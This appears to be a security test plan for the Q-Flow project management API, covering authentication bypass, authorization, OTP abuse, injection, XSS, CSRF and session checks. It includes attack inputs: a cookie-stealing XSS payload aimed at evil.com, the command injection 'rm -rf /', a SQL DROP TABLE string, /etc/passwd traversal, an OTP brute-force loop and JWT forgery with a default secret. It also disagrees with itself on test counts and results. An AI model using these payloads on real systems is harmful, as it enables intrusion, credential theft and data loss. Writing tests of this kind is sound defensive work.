# Q-Flow Security Test Cases

**Application:** Q-Flow — Quality Council of India Project Management Tool  
**Document Version:** 1.0  
**Date:** 2026-05-06  
**Total Test Cases:** 48  
**Scope:** Authentication, Authorization, Injection, XSS, CSRF, Rate Limiting, Session Management, Data Exposure, OTP Abuse, API Abuse  

---

## Legend

| Field | Values |
|---|---|
| **Severity** | Critical / High / Medium / Low |
| **Status** | Pass / Fail / Not Tested / Blocked |

**Precondition Roles Available:**
- `org_admin` — via dev bypass `X-Dev-User-Id: dev-org_admin-id` or valid JWT
- `member` — via dev bypass `X-Dev-User-Id: dev-member-id` or valid JWT
- `viewer` — via dev bypass `X-Dev-User-Id: dev-viewer-id` or valid JWT
- `executive` — via dev bypass `X-Dev-User-Id: dev-executive-id` or valid JWT

**Base URL:** `http://localhost:4000`

---

## Category 1 — Authentication Bypass

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-AUTH-001 | Authentication Bypass | Dev bypass header accepted in development | Backend running with `NODE_ENV=development` | 1. Send `GET /v1/auth/me` with header `X-Dev-User-Id: dev-org_admin-id` and no Authorization header. 2. Inspect response. | `X-Dev-User-Id: dev-org_admin-id` | Returns 200 with user object for `org_admin` | | High | Not Tested |
| SEC-AUTH-002 | Authentication Bypass | Dev bypass with unknown ID defaults to org_admin | Backend running with `NODE_ENV=development` | 1. Send `GET /v1/auth/me` with `X-Dev-User-Id: invalid-unknown-id` (not in ALLOWED_DEV_IDS set). 2. Inspect response body for role field. | `X-Dev-User-Id: invalid-unknown-id` | Returns 200 with `role: org_admin` (default fallback) — **this is the intended default but should be documented as a risk** | | Medium | Not Tested |
| SEC-AUTH-003 | Authentication Bypass | Dev bypass rejected in production | Backend running with `NODE_ENV=production` | 1. Send `GET /v1/auth/me` with `X-Dev-User-Id: dev-org_admin-id` and no Authorization header. 2. Inspect response. | `X-Dev-User-Id: dev-org_admin-id` | Returns 401 Unauthorized — bypass must NOT work in production | | Critical | Not Tested |
| SEC-AUTH-004 | Authentication Bypass | Expired JWT rejected | Valid user account exists | 1. Obtain a JWT with expiry already past (or wait 15 minutes for natural expiry). 2. Send `GET /v1/auth/me` with expired token. 3. Inspect response. | `Authorization: Bearer <expired-jwt>` | Returns 401 with `TOKEN_EXPIRED` error code | | High | Not Tested |
| SEC-AUTH-005 | Authentication Bypass | Tampered JWT signature rejected | Valid user account exists | 1. Obtain a valid JWT. 2. Decode the payload, change `"role":"member"` to `"role":"org_admin"`. 3. Re-encode with wrong signature (`base64url(header).base64url(modified_payload).original_sig`). 4. Send as Authorization header. | Modified JWT with `"role":"org_admin"` but invalid signature | Returns 401 with `TOKEN_EXPIRED` or `INVALID_TOKEN` | | Critical | Not Tested |
| SEC-AUTH-006 | Authentication Bypass | Forged JWT using known weak secret | `JWT_SECRET` is set to known placeholder | 1. Sign a new JWT with `jsonwebtoken.sign({sub:'attacker', org_id:'any', role:'org_admin'}, 'dev-secret-change-in-production-min-32-chars')`. 2. Send against `/v1/projects`. | JWT signed with placeholder secret | If secret not rotated: returns 200 with org_admin access. If rotated: returns 401 | | Critical | Not Tested |
| SEC-AUTH-007 | Authentication Bypass | Missing Authorization header | None | 1. Send `GET /v1/projects` with no headers. | No `Authorization` header | Returns 401 Unauthorized | | High | Not Tested |
| SEC-AUTH-008 | Authentication Bypass | Login with unverified account (status=pending_verification) | Register a new user without completing email OTP verification | 1. `POST /v1/auth/register` with new email. 2. Immediately `POST /v1/auth/login` with same credentials (before verifying email). 3. Inspect response. | `{"email":"newuser@test.com","password":"Test1234!"}` | Returns 401 — account is not active yet | | High | Not Tested |

---

## Category 2 — Authorization (IDOR & Privilege Escalation)

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-AUTHZ-001 | Authorization / IDOR | Member reads financial dashboard | Two accounts: org_admin (creates data) + member (attacker) | 1. Log in as `member`. 2. `GET /v1/financial/dashboard`. 3. Inspect response. | Bearer token for `member` role | **Should return 403 Forbidden** — currently returns 200 with financial data (VULN-002) | | Critical | Not Tested |
| SEC-AUTHZ-002 | Authorization / IDOR | Member reads all budgets | Member JWT available | 1. Log in as `member`. 2. `GET /v1/financial/budgets`. 3. Inspect response. | Bearer token for `member` role | Should return 403 Forbidden | | Critical | Not Tested |
| SEC-AUTHZ-003 | Authorization / IDOR | Member creates a budget | Member JWT available | 1. Log in as `member`. 2. `POST /v1/financial/budgets` with `{"name":"Fake Budget","amount":999999}`. 3. Inspect response. | `{"name":"Fake Budget","amount":999999}` | Should return 403 Forbidden | | Critical | Not Tested |
| SEC-AUTHZ-004 | Authorization / IDOR | Viewer reads revenue attribution | Viewer JWT available | 1. Log in as `viewer`. 2. `GET /v1/financial/revenue-attribution`. 3. Inspect response. | Bearer token for `viewer` role | Should return 403 Forbidden | | Critical | Not Tested |
| SEC-AUTHZ-005 | Authorization / IDOR | Executive reads org time-log summary | Executive JWT available | 1. Log in as `executive`. 2. `GET /v1/time-logs/summary/org`. 3. Inspect response. | Bearer token for `executive` role | **Should return 403 Forbidden** — currently returns 200 (VULN-003) | | High | Not Tested |
| SEC-AUTHZ-006 | Authorization / IDOR | Member deletes another user's task | Two member accounts; one has created a task | 1. Log in as `member-A`, create a task, note the task ID. 2. Log in as `member-B`. 3. `DELETE /v1/tasks/<task-id-from-member-A>`. 4. Inspect response. | `DELETE /v1/tasks/<task_id>` as different member | Should return 403 Forbidden | | Medium | Not Tested |
| SEC-AUTHZ-007 | Authorization / Privilege Escalation | Member attempts to update own role via member update API | Member JWT available | 1. Log in as `member`. 2. `PATCH /v1/members/<own-user-id>/role` with `{"role":"org_admin"}`. 3. Inspect response. | `{"role":"org_admin"}` | Returns 403 Forbidden — role update requires `org_admin` | | High | Not Tested |
| SEC-AUTHZ-008 | Authorization / IDOR | Viewer accesses another org's project | Two organizations; viewer account in org-1 | 1. Log in as `viewer` in org-1. 2. Obtain a project ID from org-2 (via enumeration). 3. `GET /v1/projects/<org2-project-id>`. 4. Inspect response. | Project ID from different organization | Returns 404 Not Found (not 403) — org scoping should prevent cross-org access | | High | Not Tested |
| SEC-AUTHZ-009 | Authorization / IDOR | Member accesses admin approval inbox | Member JWT available | 1. Log in as `member`. 2. `GET /v1/approvals`. 3. Inspect response. | Bearer token for `member` role | Should return 403 or empty dataset scoped to member only | | Medium | Not Tested |
| SEC-AUTHZ-010 | Authorization / Privilege Escalation | Member invites new user to org | Member JWT available | 1. Log in as `member`. 2. `POST /v1/members/invite` with `{"email":"newuser@test.com","role":"org_admin"}`. 3. Inspect response. | `{"email":"newuser@test.com","role":"org_admin"}` | Returns 403 Forbidden — invite requires `org_admin` or `division_admin` | | High | Not Tested |
| SEC-AUTHZ-011 | Authorization / IDOR | Executive accesses audit log | Executive JWT available | 1. Log in as `executive`. 2. `GET /v1/audit-logs`. 3. Inspect response. | Bearer token for `executive` role | Depends on implemented policy — should only be accessible to `org_admin` | | Medium | Not Tested |
| SEC-AUTHZ-012 | Authorization / IDOR | Member reads OKR data belonging to org_admin | Member JWT, OKR created by org_admin | 1. Log in as `org_admin`, create an OKR. 2. Log in as `member`. 3. `GET /v1/okrs`. 4. Inspect whether private OKRs are filtered. | Bearer token for `member` role | Member should only see OKRs assigned to them or public | | Medium | Not Tested |

---

## Category 3 — OTP Abuse

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-OTP-001 | OTP Abuse | OTP brute-force — 10 rapid attempts from single IP | Valid user account, OTP sent for password_reset | 1. `POST /v1/auth/send-otp` for a victim email. 2. Send 10 consecutive `POST /v1/auth/verify-otp` requests with wrong codes. 3. Inspect if 11th attempt is blocked. | `{"email":"victim@example.com","code":"100001","purpose":"password_reset"}` (iterate code) | Should return 429 after 5 failed attempts per email | | Critical | Not Tested |
| SEC-OTP-002 | OTP Abuse | OTP replay after successful verification | Valid user account | 1. Obtain and verify a valid OTP code. 2. Re-send the same code in a second `POST /v1/auth/verify-otp` request. 3. Inspect response. | Same valid OTP code used twice | Second attempt returns 400 — OTP is marked as used (`usedAt` set) | | High | Not Tested |
| SEC-OTP-003 | OTP Abuse | OTP expired after 10 minutes | Valid user account | 1. Request OTP. 2. Wait 10+ minutes (or manipulate system clock in test). 3. Submit the now-expired code. | Valid but expired OTP code | Returns 400 — OTP is expired | | Medium | Not Tested |
| SEC-OTP-004 | OTP Abuse | OTP invalidated when new OTP requested | Valid user account | 1. Request OTP for email A (OTP-1 created). 2. Request another OTP for the same email (OTP-2 created, OTP-1 should be invalidated). 3. Try to verify OTP-1. | OTP-1 code after requesting OTP-2 | Returns 400 — OTP-1 has been marked as used | | Medium | Not Tested |
| SEC-OTP-005 | OTP Abuse | send-otp email flooding — 5+ sends per hour from one IP | None | 1. Send 11 `POST /v1/auth/send-otp` requests for the same email within one hour. 2. Inspect rate-limit response on 6th attempt. | `{"email":"victim@example.com","purpose":"password_reset"}` | Should return 429 after 5 requests per email per hour | | High | Not Tested |
| SEC-OTP-006 | OTP Abuse | OTP enumeration — distinguish registered vs. unregistered email | None | 1. `POST /v1/auth/send-otp` for a registered email. 2. `POST /v1/auth/send-otp` for an unregistered email. 3. Compare response times and messages. | Valid email vs. nonexistent email | Both should return identical responses and timings (prevent email enumeration) | | Medium | Not Tested |
| SEC-OTP-007 | OTP Abuse | OTP purpose mismatch — request reset OTP but verify as verify_email | Valid user account | 1. Request OTP with `purpose: password_reset`. 2. Submit correct code with `purpose: verify_email`. 3. Inspect response. | OTP code with wrong purpose value | Returns 400 — purpose mismatch | | High | Not Tested |

---

## Category 4 — Injection

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-INJ-001 | SQL Injection | SQL injection in task title | Authenticated as any role | 1. `POST /v1/tasks/project/<id>` with SQL injection in the `title` field. 2. Inspect response and check if DB error leaks. | `{"title":"'; DROP TABLE tasks;--","status":"todo"}` | Returns 400 (validation error) or 201 with the literal string stored safely — no SQL error | | High | Not Tested |
| SEC-INJ-002 | SQL Injection | SQL injection in search query parameter | Authenticated as any role | 1. `GET /v1/search?q=' OR '1'='1`. 2. Inspect response. | `q=' OR '1'='1` | Returns normal search results or empty — no SQL error, no data dump | | High | Not Tested |
| SEC-INJ-003 | SQL Injection | SQL injection in filter parameter (exports) | Authenticated as org_admin | 1. `POST /v1/exports/tasks` with SQL injection in the `filters` object field. 2. Inspect response. | `{"format":"csv","filters":{"status":"' OR 1=1--"}}` | Returns 400 validation error or empty filtered result — no DB error in response | | High | Not Tested |
| SEC-INJ-004 | NoSQL / JSON Injection | JSON prototype pollution in bulk update | Authenticated as any role | 1. `PATCH /v1/tasks/bulk` with `{"__proto__":{"admin":true}}` mixed into body. 2. Inspect response and server behavior. | `{"taskIds":["id1"],"operation":"status","__proto__":{"admin":true}}` | Returns 400 validation error — `__proto__` key rejected by Zod schema | | Medium | Not Tested |
| SEC-INJ-005 | Command Injection | Malicious file format in export | Authenticated as org_admin | 1. `POST /v1/exports` with unusual characters in `format` field. 2. Inspect response. | `{"name":"Export","exportType":"tasks","format":"csv;rm -rf /"}` | Returns 400 — invalid format (only `csv`, `json`, `xlsx`, `pdf` accepted) | | Medium | Not Tested |

---

## Category 5 — Cross-Site Scripting (XSS)

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-XSS-001 | Stored XSS | XSS in task title stored and retrieved | Authenticated as member | 1. `POST /v1/tasks/project/<id>` with XSS payload in title. 2. `GET /v1/tasks/project/<id>`. 3. Inspect whether payload is stored raw. | `{"title":"<script>alert('xss')</script>"}` | Title stored as literal string — sanitization or encoding applied; no `<script>` execution when rendered | | High | Not Tested |
| SEC-XSS-002 | Stored XSS | XSS in comment body | Authenticated as member | 1. `POST /v1/comments` with XSS payload in `body` field. 2. Retrieve comment. 3. Inspect stored value. | `{"body":"<img src=x onerror=alert(1)>","taskId":"<id>"}` | Stored as literal string; `onerror` does not execute | | High | Not Tested |
| SEC-XSS-003 | Stored XSS | XSS via project description | Authenticated as project_manager or org_admin | 1. Create/update project with XSS in `description`. 2. Retrieve project. 3. Inspect value. | `{"description":"<svg onload=fetch('https://evil.com/'+document.cookie)>"}` | Description stored as literal; no script execution | | High | Not Tested |
| SEC-XSS-004 | Reflected XSS | XSS in search query returned in error message | Authenticated as any role | 1. `GET /v1/search?q=<script>alert(1)</script>`. 2. Inspect response body. | `q=<script>alert(1)</script>` | Response does not echo the raw script tag — encoded or omitted in error messages | | Medium | Not Tested |

---

## Category 6 — CSRF

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-CSRF-001 | CSRF | CSRF on task creation using refresh-token cookie | User logged in with cookie session | 1. From a different origin, craft a cross-origin POST to `POST /v1/tasks/project/<id>`. 2. The request includes credentials (cookie). 3. Observe if the server processes it. | Cross-origin POST with cookie | Should be blocked by CORS policy or rejected due to missing CSRF token | | High | Not Tested |
| SEC-CSRF-002 | CSRF | CSRF on role update (org_admin action) | User with `org_admin` logged in via cookie | 1. Craft a forged cross-origin request to `PATCH /v1/members/<userId>/role` with `{"role":"viewer"}`. 2. Submit from attacker-controlled page. | Cross-origin PATCH with cookie | Should be blocked by `sameSite=strict` on refresh cookie; however, if access token is in localStorage and sent via JS, CSRF token enforcement is absent | | High | Not Tested |
| SEC-CSRF-003 | CSRF | CSRF on logout (forces victim session revocation) | User logged in | 1. Craft a cross-origin `POST /v1/auth/logout` request. 2. Observe effect. | Cross-origin POST to logout | If using cookie auth, `sameSite=strict` should prevent this; test to confirm | | Medium | Not Tested |

---

## Category 7 — Rate Limiting

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-RL-001 | Rate Limiting | Auth limiter enforced on `/v1/auth/login` | None | 1. Send 11 `POST /v1/auth/login` requests from the same IP within 15 minutes. 2. Inspect 11th response. | 11 login attempts in 15 min | 11th attempt returns 429 Too Many Requests | | High | Not Tested |
| SEC-RL-002 | Rate Limiting | Auth limiter shared across all `/v1/auth/*` | None | 1. Send 5 `POST /v1/auth/login` + 5 `POST /v1/auth/send-otp` (total 10 requests to `/v1/auth/*`) from the same IP within 15 minutes. 2. Send 11th request. | 10 mixed auth requests | 11th attempt returns 429 — shared limiter applies to all `/v1/auth` routes | | Medium | Not Tested |
| SEC-RL-003 | Rate Limiting | Global rate limit enforced at 300 req/min | None | 1. Send 301 requests to any endpoint within 1 minute from the same IP. 2. Inspect 301st response. | 301 requests in 60 seconds | 301st returns 429 Too Many Requests | | Medium | Not Tested |
| SEC-RL-004 | Rate Limiting | Rate limit headers present in response | None | 1. Send any request to a rate-limited endpoint. 2. Inspect response headers. | Any request | `RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset` headers present (standardHeaders: true) | | Low | Not Tested |
| SEC-RL-005 | Rate Limiting | OPTIONS requests exempt from global rate limit | None | 1. Send 310 OPTIONS requests within 1 minute. 2. Inspect all responses. | 310 OPTIONS preflight requests | All return 200/204 — OPTIONS is skipped in rate-limiter config (`skip` function) | | Low | Not Tested |

---

## Category 8 — Session Management

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-SESS-001 | Session Management | Refresh token stored as httpOnly cookie | User logged in | 1. Log in via `POST /v1/auth/login`. 2. Inspect `Set-Cookie` header in response. | Login request | `refresh_token` cookie has `HttpOnly; SameSite=Strict` flags set; not accessible via `document.cookie` | | High | Not Tested |
| SEC-SESS-002 | Session Management | Refresh token not accessible via JS | User logged in from browser | 1. Log in. 2. Open browser console. 3. Run `document.cookie`. | `document.cookie` in browser console | `refresh_token` not visible — `HttpOnly` flag enforced | | High | Not Tested |
| SEC-SESS-003 | Session Management | Logout invalidates refresh token | User logged in | 1. Log in, save refresh token value. 2. Log out via `POST /v1/auth/logout`. 3. Attempt `POST /v1/auth/refresh` using the saved refresh token. | Saved refresh token after logout | Returns 401 Invalid refresh token — token revoked | | High | Not Tested |
| SEC-SESS-004 | Session Management | Access token expires after 15 minutes | User logged in | 1. Log in. Note the `expires_in: 900` in response. 2. Wait 16 minutes. 3. Use the original access token against `GET /v1/auth/me`. | Original access token after 16 min | Returns 401 `TOKEN_EXPIRED` | | High | Not Tested |
| SEC-SESS-005 | Session Management | Refresh token renews access token | User logged in | 1. Log in (access token + refresh cookie set). 2. Wait for access token to expire. 3. `POST /v1/auth/refresh` (browser sends cookie automatically). 4. Use new access token. | Expired access token + valid refresh cookie | Returns 200 with new `access_token` in response body | | High | Not Tested |
| SEC-SESS-006 | Session Management | Refresh token not accepted after expiry (7 days) | User with a 7-day old refresh token | 1. Attempt `POST /v1/auth/refresh` with expired refresh token (manipulate `expiresAt` in DB for test). | Expired refresh token | Returns 401 Invalid refresh token | | Medium | Not Tested |
| SEC-SESS-007 | Session Management | Account lockout after 5 failed login attempts | Valid user account | 1. Send 5 failed `POST /v1/auth/login` requests with wrong password. 2. Attempt login with correct password. 3. Inspect response. | Wrong password × 5, then correct password | 6th attempt (correct pw) returns 401 — account locked for 15 minutes | | High | Not Tested |

---

## Category 9 — Data Exposure

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-DATA-001 | Data Exposure | Password hash not in API response | Authenticated as any role | 1. `GET /v1/auth/me`. 2. `GET /v1/members`. 3. Inspect all user objects in response. | Any authenticated GET for user data | `passwordHash` field absent from all API responses | | High | Not Tested |
| SEC-DATA-002 | Data Exposure | Refresh token not in API response | User logs in | 1. `POST /v1/auth/login`. 2. Inspect JSON response body. | Login response body | `refresh_token` not present in JSON body — only in `Set-Cookie` header | | High | Not Tested |
| SEC-DATA-003 | Data Exposure | Health endpoint exposes server info | None | 1. `GET /health` without any authentication. 2. Inspect response. | No credentials | Returns `{"status":"ok","timestamp":"..."}` — no sensitive info beyond timestamp | | Low | Not Tested |
| SEC-DATA-004 | Data Exposure | Error messages do not expose stack traces | Trigger a server error (invalid UUID, malformed JSON) | 1. Send `GET /v1/projects/not-a-valid-uuid` (if UUID validation triggers a DB error). 2. Inspect error response. | Invalid UUID in URL | Error response contains `code` and `message` fields only — no stack trace, no Prisma error detail | | Medium | Not Tested |
| SEC-DATA-005 | Data Exposure | Member cannot read another org's data via exports | Authenticated as member in org-1 | 1. `POST /v1/exports/tasks` as member in org-1. 2. Inspect exported data. 3. Verify all tasks belong to org-1 only. | `{"format":"csv"}` | Exported tasks filtered by `orgId` — no cross-org data | | High | Not Tested |
| SEC-DATA-006 | Data Exposure | Financial ROI endpoint scoped to org | Authenticated as org_admin (once VULN-002 fixed) | 1. Obtain a budgetId from org-1. 2. `GET /v1/financial/roi/<budgetId>` as org-2 admin. 3. Inspect response. | Budget ID from different org | Returns 404 Not Found — cross-org access prevented | | High | Not Tested |

---

## Category 10 — API Abuse

| TC-ID | Category | Test Name | Preconditions | Steps | Payload / Input | Expected Result | Actual Result | Severity | Status |
|---|---|---|---|---|---|---|---|---|---|
| SEC-API-001 | API Abuse | Oversized JSON body rejected | None | 1. Send `POST /v1/tasks/project/<id>` with a JSON body exceeding 2MB. 2. Inspect response. | JSON body > 2MB | Returns 413 Payload Too Large | | Medium | Not Tested |
| SEC-API-002 | API Abuse | Bulk task update — exceed 100 task IDs | Authenticated as org_admin | 1. `PATCH /v1/tasks/bulk` with `taskIds` array of 101 items. 2. Inspect response. | `{"taskIds":["id1",...(101 items)],"operation":"status","value":"done"}` | Returns 400 — Zod schema enforces `max(100)` | | Low | Not Tested |
| SEC-API-003 | API Abuse | Negative pagination values rejected | Authenticated as any role | 1. `GET /v1/members?page=-1&page_size=-5`. 2. Inspect response. | `page=-1&page_size=-5` | Returns 400 or defaults to valid values (min 1) — no SQL offset error | | Low | Not Tested |
| SEC-API-004 | API Abuse | Invalid enum value in task create | Authenticated as member | 1. `POST /v1/tasks/project/<id>` with `priority: "super_critical"`. 2. Inspect response. | `{"title":"Test","priority":"super_critical"}` | Returns 400 validation error — only valid priority values accepted | | Low | Not Tested |
| SEC-API-005 | API Abuse | Path traversal in export ID | Authenticated as org_admin | 1. `GET /v1/exports/../../../etc/passwd`. 2. Inspect response. | `/../../../etc/passwd` as ID path | Returns 404 Not Found — Express normalizes path, Prisma query with the string returns empty | | Medium | Not Tested |
| SEC-API-006 | API Abuse | Register with duplicate email returns generic error | User already registered with email | 1. `POST /v1/auth/register` with an already-registered email. 2. Inspect response. | Existing email address | Returns 409 Conflict — does NOT leak confirmation that the email exists (should say "email already registered" which technically confirms the email; consider changing to a generic message) | | Low | Not Tested |
| SEC-API-007 | API Abuse | CORS rejects requests from non-whitelisted origins | Production CORS config | 1. Send request with `Origin: http://evil.com` to any endpoint. 2. Inspect CORS headers in response. | `Origin: http://evil.com` | Response does not include `Access-Control-Allow-Origin: http://evil.com` — CORS blocks it | | High | Not Tested |
| SEC-API-008 | API Abuse | X-Frame-Options / frameguard header present | None | 1. Send any GET request to the API. 2. Inspect `X-Frame-Options` response header. | Any request | `X-Frame-Options: DENY` present (from Helmet `frameguard: { action: 'deny' }`) | | Low | Not Tested |

---

## Summary by Category

| Category | Total TCs | Critical | High | Medium | Low |
|---|---|---|---|---|---|
| Authentication Bypass | 8 | 3 | 4 | 1 | 0 |
| Authorization / IDOR | 12 | 4 | 5 | 3 | 0 |
| OTP Abuse | 7 | 1 | 3 | 3 | 0 |
| Injection | 5 | 0 | 3 | 2 | 0 |
| XSS | 4 | 0 | 3 | 1 | 0 |
| CSRF | 3 | 0 | 2 | 1 | 0 |
| Rate Limiting | 5 | 0 | 1 | 2 | 2 |
| Session Management | 7 | 0 | 6 | 1 | 0 |
| Data Exposure | 6 | 0 | 4 | 1 | 1 |
| API Abuse | 8 | 0 | 1 | 2 | 5 |
| **Total** | **65** | **8** | **32** | **17** | **8** |

---

## Execution Notes

### Running Tests with curl (development environment)

**Set up aliases:**
```bash
BASE="http://localhost:4000"
ADMIN_HDR="X-Dev-User-Id: dev-org_admin-id"
MEMBER_HDR="X-Dev-User-Id: dev-member-id"
VIEWER_HDR="X-Dev-User-Id: dev-viewer-id"
EXEC_HDR="X-Dev-User-Id: dev-executive-id"
```

**Example: Run SEC-AUTHZ-001 (Financial access as member)**
```bash
curl -s "$BASE/v1/financial/dashboard" \
  -H "Content-Type: application/json" \
  -H "$MEMBER_HDR"
# Expected: 403 | Actual: 200 (FAIL — VULN-002 confirmed)
```

**Example: Run SEC-OTP-001 (OTP brute-force)**
```bash
# Send OTP first
curl -s -X POST "$BASE/v1/auth/send-otp" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","purpose":"password_reset"}'

# Brute-force first 20 codes
for CODE in $(seq -w 100000 100020); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/v1/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@example.com\",\"code\":\"$CODE\",\"purpose\":\"password_reset\"}")
  echo "Code: $CODE → HTTP $STATUS"
done
# Expected: 429 after 5 attempts | Actual: 400 for each (no lockout — FAIL)
```

**Example: Run SEC-AUTH-006 (JWT forgery with known weak secret)**
```bash
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: 'forged-id', org_id: 'dev-org-id', role: 'org_admin', email: 'attacker@evil.com' },
  'dev-secret-change-in-production-min-32-chars',
  { expiresIn: '1h' }
);
console.log(token);
"
# Use the output token:
curl -s "$BASE/v1/projects" \
  -H "Authorization: Bearer <forged-token>"
```
